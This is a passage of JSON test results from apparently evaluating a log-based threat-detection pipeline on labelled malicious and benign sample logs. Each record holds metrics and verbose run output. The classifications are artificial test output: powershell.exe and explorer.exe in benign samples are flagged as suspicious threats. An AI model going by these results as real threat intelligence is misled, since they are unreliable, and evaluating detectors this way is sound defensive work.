      "peak_memory_mb": 27.11,
      "raw_output": "\ud83e\uddea Performing AFRETIP Dry Run\n\ud83d\udcc1 Using configuration: config/config-dev.yaml\n2025-08-18 20:13:02 [info     ] Configuration loaded successfully path=config/config-dev.yaml sections=['wazuh', 'processing', 'extraction', 'storage', 'analytics', 'deployment', 'logging', 'reputation_services', 'threat_intelligence', 'hybrid_classification', 'whitelist', 'rule_generation', 'monitoring', 'performance', 'development']\n\u2705 Configuration structure validated\n\ud83d\udcc4 Processing sample log: experiments/malicious/lateral_movement/lat_01_psexec.json\n\ud83d\udd27 Initializing processing engine...\n2025-08-18 20:13:02 [info     ] Enhanced IOC Extractor initialized confidence_threshold=0.3 context_filtering=True\n2025-08-18 20:13:02 [info     ] Threat intelligence database schema initialized\n2025-08-18 20:13:02 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 20:13:02 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 20:13:02 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 20:13:02 [info     ] Custom whitelist disabled - using built-in defaults only\n2025-08-18 20:13:02 [info     ] IOC Classifier initialized with hybrid detection whitelist_domains=13 whitelist_ips=5 whitelist_processes=0\n2025-08-18 20:13:02 [info     ] Threat intelligence database schema initialized\n2025-08-18 20:13:02 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 20:13:02 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 20:13:02 [info     ] Threat intelligence database schema initialized\n2025-08-18 20:13:02 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 20:13:02 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 20:13:02 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 20:13:02 [info     ] Custom whitelist disabled - using built-in defaults only\n2025-08-18 20:13:02 [info     ] IOC Classifier initialized with hybrid detection whitelist_domains=13 whitelist_ips=5 whitelist_processes=0\n2025-08-18 20:13:02 [info     ] Threat intelligence database schema initialized\n2025-08-18 20:13:02 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 20:13:02 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 20:13:02 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 20:13:02 [info     ] Threat detector initialized    confidence_threshold=0.6 novelty_detection=True novelty_threshold=0.7 pattern_detection=True\n2025-08-18 20:13:02 [info     ] Parsing existing rules from: /var/ossec/etc/rules\n2025-08-18 20:13:02 [warning  ] Rules directory not found: /var/ossec/etc/rules\n2025-08-18 20:13:02 [info     ] Initialized rule generator with existing rule checking\n2025-08-18 20:13:02 [info     ] Parsing existing rules from: data/rules\n2025-08-18 20:13:02 [info     ] Parsed 0 existing rules, IOC coverage for 0 IOCs\n2025-08-18 20:13:02 [info     ] Initialized rule generator with existing rule checking\n2025-08-18 20:13:02 [info     ] Analytics metrics initialized  output_dir=data/analytics session_id=20250818_201302\n2025-08-18 20:13:02 [info     ] Analytics metrics enabled for data collection\n2025-08-18 20:13:02 [info     ] Processing engine initialized\n\u2699\ufe0f Processing sample log...\n2025-08-18 20:13:02 [debug    ] IOC filtered due to legitimate context context=business_application ioc_type=ip ioc_value=192.168.1.10\n2025-08-18 20:13:02 [debug    ] IOC filtered due to legitimate context context=business_application ioc_type=ip ioc_value=192.168.1.50\n2025-08-18 20:13:02 [debug    ] Enhanced IOC extraction completed context=business_application extraction_time=0.001s iocs_found=1 log_hash=ffa79acc84594232a5e761595ee1129a\n2025-08-18 20:13:02 [debug    ] IOC type not supported by VirusTotal ioc_type=<IOCType.PROCESS_NAME: 'process_name'>\n\n\ud83d\udcca Sample Log Processing Results:\n  \u2022 IOCs extracted: 1\n  \u2022 Findings generated: 0\n  \u2022 Rules generated: 0\n  \u2022 Processing time: 0.001s\n\n\ud83d\udd0d Extracted IOCs (showing first 5):\n  \u2022 IOCType.PROCESS_NAME: psexec.exe (confidence: 0.45)\n\n\ud83c\udf89 Dry run successful!\n\u2705 The pipeline should work correctly with this configuration\n",
      "errors": ""
    },
    {
      "test_file": "lat_02_wmi_execution.json",
      "test_category": "malicious",
      "timestamp": "2025-08-18T20:13:03.069274",
      "processing_time": 0.41051721572875977,
      "success": true,
      "metrics": {
        "iocs_extracted": 0,
        "findings_generated": 0,
        "rules_generated": 0,
        "ioc_extraction_time": 0.001,
        "threat_classifications": {},
        "confidence_scores": [],
        "threat_levels": {},
        "rule_generation_efficiency": 0.0
      },
      "memory_delta_mb": 0.0,
      "peak_memory_mb": 27.11,
      "raw_output": "\ud83e\uddea Performing AFRETIP Dry Run\n\ud83d\udcc1 Using configuration: config/config-dev.yaml\n2025-08-18 20:13:02 [info     ] Configuration loaded successfully path=config/config-dev.yaml sections=['wazuh', 'processing', 'extraction', 'storage', 'analytics', 'deployment', 'logging', 'reputation_services', 'threat_intelligence', 'hybrid_classification', 'whitelist', 'rule_generation', 'monitoring', 'performance', 'development']\n\u2705 Configuration structure validated\n\ud83d\udcc4 Processing sample log: experiments/malicious/lateral_movement/lat_02_wmi_execution.json\n\ud83d\udd27 Initializing processing engine...\n2025-08-18 20:13:02 [info     ] Enhanced IOC Extractor initialized confidence_threshold=0.3 context_filtering=True\n2025-08-18 20:13:02 [info     ] Threat intelligence database schema initialized\n2025-08-18 20:13:02 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 20:13:02 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 20:13:02 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 20:13:02 [info     ] Custom whitelist disabled - using built-in defaults only\n2025-08-18 20:13:02 [info     ] IOC Classifier initialized with hybrid detection whitelist_domains=13 whitelist_ips=5 whitelist_processes=0\n2025-08-18 20:13:02 [info     ] Threat intelligence database schema initialized\n2025-08-18 20:13:02 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 20:13:02 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 20:13:02 [info     ] Threat intelligence database schema initialized\n2025-08-18 20:13:02 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 20:13:02 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 20:13:02 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 20:13:02 [info     ] Custom whitelist disabled - using built-in defaults only\n2025-08-18 20:13:02 [info     ] IOC Classifier initialized with hybrid detection whitelist_domains=13 whitelist_ips=5 whitelist_processes=0\n2025-08-18 20:13:02 [info     ] Threat intelligence database schema initialized\n2025-08-18 20:13:02 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 20:13:02 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 20:13:02 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 20:13:02 [info     ] Threat detector initialized    confidence_threshold=0.6 novelty_detection=True novelty_threshold=0.7 pattern_detection=True\n2025-08-18 20:13:02 [info     ] Parsing existing rules from: /var/ossec/etc/rules\n2025-08-18 20:13:02 [warning  ] Rules directory not found: /var/ossec/etc/rules\n2025-08-18 20:13:02 [info     ] Initialized rule generator with existing rule checking\n2025-08-18 20:13:02 [info     ] Parsing existing rules from: data/rules\n2025-08-18 20:13:02 [info     ] Parsed 0 existing rules, IOC coverage for 0 IOCs\n2025-08-18 20:13:02 [info     ] Initialized rule generator with existing rule checking\n2025-08-18 20:13:02 [info     ] Analytics metrics initialized  output_dir=data/analytics session_id=20250818_201302\n2025-08-18 20:13:02 [info     ] Analytics metrics enabled for data collection\n2025-08-18 20:13:02 [info     ] Processing engine initialized\n\u2699\ufe0f Processing sample log...\n2025-08-18 20:13:02 [debug    ] IOC filtered due to legitimate context context=business_application ioc_type=ip ioc_value=192.168.1.100\n2025-08-18 20:13:02 [debug    ] IOC filtered due to legitimate context context=business_application ioc_type=ip ioc_value=192.168.1.50\n2025-08-18 20:13:02 [debug    ] Enhanced IOC extraction completed context=business_application extraction_time=0.000s iocs_found=0 log_hash=30b504dbf41c40e4a6bafb33c17bab9d\n\n\ud83d\udcca Sample Log Processing Results:\n  \u2022 IOCs extracted: 0\n  \u2022 Findings generated: 0\n  \u2022 Rules generated: 0\n  \u2022 Processing time: 0.001s\n\n\ud83c\udf89 Dry run successful!\n\u2705 The pipeline should work correctly with this configuration\n",
      "errors": ""
    },
    {
      "test_file": "ben_06_office_automation.json",
      "test_category": "benign",
      "timestamp": "2025-08-18T20:13:03.613173",
      "processing_time": 0.5431382656097412,
      "success": true,
      "metrics": {
        "iocs_extracted": 0,
        "findings_generated": 0,
        "rules_generated": 0,
        "ioc_extraction_time": 0.001,
        "threat_classifications": {},
        "confidence_scores": [],
        "threat_levels": {},
        "rule_generation_efficiency": 0.0
      },
      "memory_delta_mb": 0.0,
      "peak_memory_mb": 27.11,
      "raw_output": "\ud83e\uddea Performing AFRETIP Dry Run\n\ud83d\udcc1 Using configuration: config/config-dev.yaml\n2025-08-18 20:13:03 [info     ] Configuration loaded successfully path=config/config-dev.yaml sections=['wazuh', 'processing', 'extraction', 'storage', 'analytics', 'deployment', 'logging', 'reputation_services', 'threat_intelligence', 'hybrid_classification', 'whitelist', 'rule_generation', 'monitoring', 'performance', 'development']\n\u2705 Configuration structure validated\n\ud83d\udcc4 Processing sample log: experiments/benign/business_applications/ben_06_office_automation.json\n\ud83d\udd27 Initializing processing engine...\n2025-08-18 20:13:03 [info     ] Enhanced IOC Extractor initialized confidence_threshold=0.3 context_filtering=True\n2025-08-18 20:13:03 [info     ] Threat intelligence database schema initialized\n2025-08-18 20:13:03 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 20:13:03 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 20:13:03 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 20:13:03 [info     ] Custom whitelist disabled - using built-in defaults only\n2025-08-18 20:13:03 [info     ] IOC Classifier initialized with hybrid detection whitelist_domains=13 whitelist_ips=5 whitelist_processes=0\n2025-08-18 20:13:03 [info     ] Threat intelligence database schema initialized\n2025-08-18 20:13:03 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 20:13:03 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 20:13:03 [info     ] Threat intelligence database schema initialized\n2025-08-18 20:13:03 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 20:13:03 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 20:13:03 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 20:13:03 [info     ] Custom whitelist disabled - using built-in defaults only\n2025-08-18 20:13:03 [info     ] IOC Classifier initialized with hybrid detection whitelist_domains=13 whitelist_ips=5 whitelist_processes=0\n2025-08-18 20:13:03 [info     ] Threat intelligence database schema initialized\n2025-08-18 20:13:03 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 20:13:03 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 20:13:03 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 20:13:03 [info     ] Threat detector initialized    confidence_threshold=0.6 novelty_detection=True novelty_threshold=0.7 pattern_detection=True\n2025-08-18 20:13:03 [info     ] Parsing existing rules from: /var/ossec/etc/rules\n2025-08-18 20:13:03 [warning  ] Rules directory not found: /var/ossec/etc/rules\n2025-08-18 20:13:03 [info     ] Initialized rule generator with existing rule checking\n2025-08-18 20:13:03 [info     ] Parsing existing rules from: data/rules\n2025-08-18 20:13:03 [info     ] Parsed 0 existing rules, IOC coverage for 0 IOCs\n2025-08-18 20:13:03 [info     ] Initialized rule generator with existing rule checking\n2025-08-18 20:13:03 [info     ] Analytics metrics initialized  output_dir=data/analytics session_id=20250818_201303\n2025-08-18 20:13:03 [info     ] Analytics metrics enabled for data collection\n2025-08-18 20:13:03 [info     ] Processing engine initialized\n\u2699\ufe0f Processing sample log...\n2025-08-18 20:13:03 [debug    ] IOC filtered due to legitimate context context=business_application ioc_type=ip ioc_value=192.168.1.150\n2025-08-18 20:13:03 [debug    ] Enhanced IOC extraction completed context=business_application extraction_time=0.001s iocs_found=0 log_hash=ac30a6d32d5342369fe6d2594e2b6c9d\n\n\ud83d\udcca Sample Log Processing Results:\n  \u2022 IOCs extracted: 0\n  \u2022 Findings generated: 0\n  \u2022 Rules generated: 0\n  \u2022 Processing time: 0.001s\n\n\ud83c\udf89 Dry run successful!\n\u2705 The pipeline should work correctly with this configuration\n",
      "errors": ""
    },
    {
      "test_file": "ben_11_windows_updates.json",
      "test_category": "benign",
      "timestamp": "2025-08-18T20:13:04.472247",
      "processing_time": 0.8579850196838379,
      "success": true,
      "metrics": {
        "iocs_extracted": 0,
        "findings_generated": 0,
        "rules_generated": 0,
        "ioc_extraction_time": 0.001,
        "threat_classifications": {},
        "confidence_scores": [],
        "threat_levels": {},
        "rule_generation_efficiency": 0.0
      },
      "memory_delta_mb": 0.0,
      "peak_memory_mb": 27.11,
      "raw_output": "\ud83e\uddea Performing AFRETIP Dry Run\n\ud83d\udcc1 Using configuration: config/config-dev.yaml\n2025-08-18 20:13:04 [info     ] Configuration loaded successfully path=config/config-dev.yaml sections=['wazuh', 'processing', 'extraction', 'storage', 'analytics', 'deployment', 'logging', 'reputation_services', 'threat_intelligence', 'hybrid_classification', 'whitelist', 'rule_generation', 'monitoring', 'performance', 'development']\n\u2705 Configuration structure validated\n\ud83d\udcc4 Processing sample log: experiments/benign/system_processes/ben_11_windows_updates.json\n\ud83d\udd27 Initializing processing engine...\n2025-08-18 20:13:04 [info     ] Enhanced IOC Extractor initialized confidence_threshold=0.3 context_filtering=True\n2025-08-18 20:13:04 [info     ] Threat intelligence database schema initialized\n2025-08-18 20:13:04 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 20:13:04 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 20:13:04 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 20:13:04 [info     ] Custom whitelist disabled - using built-in defaults only\n2025-08-18 20:13:04 [info     ] IOC Classifier initialized with hybrid detection whitelist_domains=13 whitelist_ips=5 whitelist_processes=0\n2025-08-18 20:13:04 [info     ] Threat intelligence database schema initialized\n2025-08-18 20:13:04 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 20:13:04 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 20:13:04 [info     ] Threat intelligence database schema initialized\n2025-08-18 20:13:04 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 20:13:04 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 20:13:04 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 20:13:04 [info     ] Custom whitelist disabled - using built-in defaults only\n2025-08-18 20:13:04 [info     ] IOC Classifier initialized with hybrid detection whitelist_domains=13 whitelist_ips=5 whitelist_processes=0\n2025-08-18 20:13:04 [info     ] Threat intelligence database schema initialized\n2025-08-18 20:13:04 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 20:13:04 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 20:13:04 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 20:13:04 [info     ] Threat detector initialized    confidence_threshold=0.6 novelty_detection=True novelty_threshold=0.7 pattern_detection=True\n2025-08-18 20:13:04 [info     ] Parsing existing rules from: /var/ossec/etc/rules\n2025-08-18 20:13:04 [warning  ] Rules directory not found: /var/ossec/etc/rules\n2025-08-18 20:13:04 [info     ] Initialized rule generator with existing rule checking\n2025-08-18 20:13:04 [info     ] Parsing existing rules from: data/rules\n2025-08-18 20:13:04 [info     ] Parsed 0 existing rules, IOC coverage for 0 IOCs\n2025-08-18 20:13:04 [info     ] Initialized rule generator with existing rule checking\n2025-08-18 20:13:04 [info     ] Analytics metrics initialized  output_dir=data/analytics session_id=20250818_201304\n2025-08-18 20:13:04 [info     ] Analytics metrics enabled for data collection\n2025-08-18 20:13:04 [info     ] Processing engine initialized\n\u2699\ufe0f Processing sample log...\n2025-08-18 20:13:04 [debug    ] Enhanced IOC extraction completed context='windows update' extraction_time=0.001s iocs_found=0 log_hash=f08c911e322442f7912a79d2cc0933ce\n\n\ud83d\udcca Sample Log Processing Results:\n  \u2022 IOCs extracted: 0\n  \u2022 Findings generated: 0\n  \u2022 Rules generated: 0\n  \u2022 Processing time: 0.001s\n\n\ud83c\udf89 Dry run successful!\n\u2705 The pipeline should work correctly with this configuration\n",
      "errors": ""
    },
    {
      "test_file": "ben_16_cloud_sync.json",
      "test_category": "benign",
      "timestamp": "2025-08-18T20:13:06.980817",
      "processing_time": 2.507841110229492,
      "success": true,
      "metrics": {
        "iocs_extracted": 1,
        "findings_generated": 0,
        "rules_generated": 0,
        "ioc_extraction_time": 1.358,
        "threat_classifications": {},
        "confidence_scores": [],
        "threat_levels": {},
        "rule_generation_efficiency": 0.0
      },
      "memory_delta_mb": 0.0,
      "peak_memory_mb": 27.11,
      "raw_output": "\ud83e\uddea Performing AFRETIP Dry Run\n\ud83d\udcc1 Using configuration: config/config-dev.yaml\n2025-08-18 20:13:05 [info     ] Configuration loaded successfully path=config/config-dev.yaml sections=['wazuh', 'processing', 'extraction', 'storage', 'analytics', 'deployment', 'logging', 'reputation_services', 'threat_intelligence', 'hybrid_classification', 'whitelist', 'rule_generation', 'monitoring', 'performance', 'development']\n\u2705 Configuration structure validated\n\ud83d\udcc4 Processing sample log: experiments/benign/legitimate_network/ben_16_cloud_sync.json\n\ud83d\udd27 Initializing processing engine...\n2025-08-18 20:13:05 [info     ] Enhanced IOC Extractor initialized confidence_threshold=0.3 context_filtering=True\n2025-08-18 20:13:05 [info     ] Threat intelligence database schema initialized\n2025-08-18 20:13:05 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 20:13:05 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 20:13:05 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 20:13:05 [info     ] Custom whitelist disabled - using built-in defaults only\n2025-08-18 20:13:05 [info     ] IOC Classifier initialized with hybrid detection whitelist_domains=13 whitelist_ips=5 whitelist_processes=0\n2025-08-18 20:13:05 [info     ] Threat intelligence database schema initialized\n2025-08-18 20:13:05 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 20:13:05 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 20:13:05 [info     ] Threat intelligence database schema initialized\n2025-08-18 20:13:05 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 20:13:05 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 20:13:05 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 20:13:05 [info     ] Custom whitelist disabled - using built-in defaults only\n2025-08-18 20:13:05 [info     ] IOC Classifier initialized with hybrid detection whitelist_domains=13 whitelist_ips=5 whitelist_processes=0\n2025-08-18 20:13:05 [info     ] Threat intelligence database schema initialized\n2025-08-18 20:13:05 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 20:13:05 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 20:13:05 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 20:13:05 [info     ] Threat detector initialized    confidence_threshold=0.6 novelty_detection=True novelty_threshold=0.7 pattern_detection=True\n2025-08-18 20:13:05 [info     ] Parsing existing rules from: /var/ossec/etc/rules\n2025-08-18 20:13:05 [warning  ] Rules directory not found: /var/ossec/etc/rules\n2025-08-18 20:13:05 [info     ] Initialized rule generator with existing rule checking\n2025-08-18 20:13:05 [info     ] Parsing existing rules from: data/rules\n2025-08-18 20:13:05 [info     ] Parsed 0 existing rules, IOC coverage for 0 IOCs\n2025-08-18 20:13:05 [info     ] Initialized rule generator with existing rule checking\n2025-08-18 20:13:05 [info     ] Analytics metrics initialized  output_dir=data/analytics session_id=20250818_201305\n2025-08-18 20:13:05 [info     ] Analytics metrics enabled for data collection\n2025-08-18 20:13:05 [info     ] Processing engine initialized\n\u2699\ufe0f Processing sample log...\n2025-08-18 20:13:05 [debug    ] IOC filtered due to legitimate context context=business_application ioc_type=ip ioc_value=192.168.1.100\n2025-08-18 20:13:05 [debug    ] IOC filtered due to legitimate context context=business_application ioc_type=ip ioc_value=192.168.1.100\n2025-08-18 20:13:05 [debug    ] IOC filtered due to legitimate context context=business_application ioc_type=domain ioc_value=onedrive.live.com\n2025-08-18 20:13:05 [debug    ] Enhanced IOC extraction completed context=business_application extraction_time=0.002s iocs_found=1 log_hash=c36f53be457946bf981f577cc403f400\n\n\ud83d\udcca Sample Log Processing Results:\n  \u2022 IOCs extracted: 1\n  \u2022 Findings generated: 0\n  \u2022 Rules generated: 0\n  \u2022 Processing time: 1.358s\n\n\ud83d\udd0d Extracted IOCs (showing first 5):\n  \u2022 IOCType.IP: 40.126.25.40 (confidence: 0.35)\n\n\ud83c\udf89 Dry run successful!\n\u2705 The pipeline should work correctly with this configuration\n",
      "errors": ""
    },
    {
      "test_file": "ben_01_admin_powershell.json",
      "test_category": "benign",
      "timestamp": "2025-08-18T20:14:08.077530",
      "processing_time": 61.09577202796936,
      "success": true,
      "metrics": {
        "iocs_extracted": 5,
        "findings_generated": 2,
        "rules_generated": 2,
        "ioc_extraction_time": 60.073,
        "threat_classifications": {
          "suspicious": 2
        },
        "confidence_scores": [
          0.65,
          0.65
        ],
        "threat_levels": {
          "medium": 2
        },
        "rule_generation_efficiency": 1.0
      },
      "memory_delta_mb": 0.0,
      "peak_memory_mb": 27.11,
      "raw_output": "\ud83e\uddea Performing AFRETIP Dry Run\n\ud83d\udcc1 Using configuration: config/config-dev.yaml\n2025-08-18 20:13:07 [info     ] Configuration loaded successfully path=config/config-dev.yaml sections=['wazuh', 'processing', 'extraction', 'storage', 'analytics', 'deployment', 'logging', 'reputation_services', 'threat_intelligence', 'hybrid_classification', 'whitelist', 'rule_generation', 'monitoring', 'performance', 'development']\n\u2705 Configuration structure validated\n\ud83d\udcc4 Processing sample log: experiments/benign/legitimate_admin/ben_01_admin_powershell.json\n\ud83d\udd27 Initializing processing engine...\n2025-08-18 20:13:07 [info     ] Enhanced IOC Extractor initialized confidence_threshold=0.3 context_filtering=True\n2025-08-18 20:13:07 [info     ] Threat intelligence database schema initialized\n2025-08-18 20:13:07 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 20:13:07 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 20:13:07 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 20:13:07 [info     ] Custom whitelist disabled - using built-in defaults only\n2025-08-18 20:13:07 [info     ] IOC Classifier initialized with hybrid detection whitelist_domains=13 whitelist_ips=5 whitelist_processes=0\n2025-08-18 20:13:07 [info     ] Threat intelligence database schema initialized\n2025-08-18 20:13:07 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 20:13:07 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 20:13:07 [info     ] Threat intelligence database schema initialized\n2025-08-18 20:13:07 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 20:13:07 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 20:13:07 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 20:13:07 [info     ] Custom whitelist disabled - using built-in defaults only\n2025-08-18 20:13:07 [info     ] IOC Classifier initialized with hybrid detection whitelist_domains=13 whitelist_ips=5 whitelist_processes=0\n2025-08-18 20:13:07 [info     ] Threat intelligence database schema initialized\n2025-08-18 20:13:07 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 20:13:07 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 20:13:07 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 20:13:07 [info     ] Threat detector initialized    confidence_threshold=0.6 novelty_detection=True novelty_threshold=0.7 pattern_detection=True\n2025-08-18 20:13:07 [info     ] Parsing existing rules from: /var/ossec/etc/rules\n2025-08-18 20:13:07 [warning  ] Rules directory not found: /var/ossec/etc/rules\n2025-08-18 20:13:07 [info     ] Initialized rule generator with existing rule checking\n2025-08-18 20:13:07 [info     ] Parsing existing rules from: data/rules\n2025-08-18 20:13:07 [info     ] Parsed 0 existing rules, IOC coverage for 0 IOCs\n2025-08-18 20:13:07 [info     ] Initialized rule generator with existing rule checking\n2025-08-18 20:13:07 [info     ] Analytics metrics initialized  output_dir=data/analytics session_id=20250818_201307\n2025-08-18 20:13:07 [info     ] Analytics metrics enabled for data collection\n2025-08-18 20:13:07 [info     ] Processing engine initialized\n\u2699\ufe0f Processing sample log...\n2025-08-18 20:13:07 [debug    ] Enhanced IOC extraction completed context=administrative extraction_time=0.006s iocs_found=5 log_hash=f27340779ea54b7099c49f71fbcdf8ef\n2025-08-18 20:13:08 [debug    ] VirusTotal rate limiting       sleep_time=14.07140302658081\n2025-08-18 20:13:23 [debug    ] VirusTotal rate limiting       sleep_time=14.039029836654663\n2025-08-18 20:13:37 [debug    ] IOC type not supported by VirusTotal ioc_type=<IOCType.FILE_PATH: 'file_path'>\n2025-08-18 20:13:37 [info     ] Threat detected                classification=suspicious confidence=0.65 ioc_type=file_path ioc_value=C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe threat_level=medium\n2025-08-18 20:13:37 [debug    ] VirusTotal rate limiting       sleep_time=14.997673988342285\n2025-08-18 20:13:52 [debug    ] IOC type not supported by VirusTotal ioc_type=<IOCType.FILE_PATH: 'file_path'>\n2025-08-18 20:13:52 [info     ] Threat detected                classification=suspicious confidence=0.65 ioc_type=file_path ioc_value=C:\\\\Windows\\\\explorer.exe threat_level=medium\n2025-08-18 20:13:52 [debug    ] VirusTotal rate limiting       sleep_time=14.998097896575928\n2025-08-18 20:14:07 [debug    ] IOC type not supported by VirusTotal ioc_type=<IOCType.PROCESS_NAME: 'process_name'>\n2025-08-18 20:14:07 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=4bf861f27c8f44aabc2fb63a6d00ff26 new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 20:14:07 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=9e5d5e36ff3346df9e30505e22a147a0 new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n\n\ud83d\udcca Sample Log Processing Results:\n  \u2022 IOCs extracted: 5\n  \u2022 Findings generated: 2\n  \u2022 Rules generated: 2\n  \u2022 Processing time: 60.073s\n\n\ud83d\udd0d Extracted IOCs (showing first 5):\n  \u2022 IOCType.DOMAIN: powershell.exe (confidence: 0.40)\n  \u2022 IOCType.DOMAIN: explorer.exe (confidence: 0.40)\n  \u2022 IOCType.FILE_PATH: C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe (confidence: 0.40)\n  \u2022 IOCType.FILE_PATH: C:\\\\Windows\\\\explorer.exe (confidence: 0.40)\n  \u2022 IOCType.PROCESS_NAME: powershell.exe (confidence: 0.40)\n\n\ud83c\udf89 Dry run successful!\n\u2705 The pipeline should work correctly with this configuration\n",
      "errors": ""
    },
    {
      "test_file": "ben_02_system_maintenance.json",
      "test_category": "benign",
      "timestamp": "2025-08-18T20:15:08.896361",
      "processing_time": 60.817745208740234,
      "success": true,
      "metrics": {
        "iocs_extracted": 5,
        "findings_generated": 2,
        "rules_generated": 2,
        "ioc_extraction_time": 60.063,
        "threat_classifications": {
          "suspicious": 2
        },
        "confidence_scores": [
          0.65,
          0.65
        ],
        "threat_levels": {
          "medium": 2
        },
        "rule_generation_efficiency": 1.0
      },
      "memory_delta_mb": 0.0,
      "peak_memory_mb": 27.11,
      "raw_output": "\ud83e\uddea Performing AFRETIP Dry Run\n\ud83d\udcc1 Using configuration: config/config-dev.yaml\n2025-08-18 20:14:08 [info     ] Configuration loaded successfully path=config/config-dev.yaml sections=['wazuh', 'processing', 'extraction', 'storage', 'analytics', 'deployment', 'logging', 'reputation_services', 'threat_intelligence', 'hybrid_classification', 'whitelist', 'rule_generation', 'monitoring', 'performance', 'development']\n\u2705 Configuration structure validated\n\ud83d\udcc4 Processing sample log: experiments/benign/legitimate_admin/ben_02_system_maintenance.json\n\ud83d\udd27 Initializing processing engine...\n2025-08-18 20:14:08 [info     ] Enhanced IOC Extractor initialized confidence_threshold=0.3 context_filtering=True\n2025-08-18 20:14:08 [info     ] Threat intelligence database schema initialized\n2025-08-18 20:14:08 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 20:14:08 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 20:14:08 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 20:14:08 [info     ] Custom whitelist disabled - using built-in defaults only\n2025-08-18 20:14:08 [info     ] IOC Classifier initialized with hybrid detection whitelist_domains=13 whitelist_ips=5 whitelist_processes=0\n2025-08-18 20:14:08 [info     ] Threat intelligence database schema initialized\n2025-08-18 20:14:08 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 20:14:08 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 20:14:08 [info     ] Threat intelligence database schema initialized\n2025-08-18 20:14:08 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 20:14:08 [info  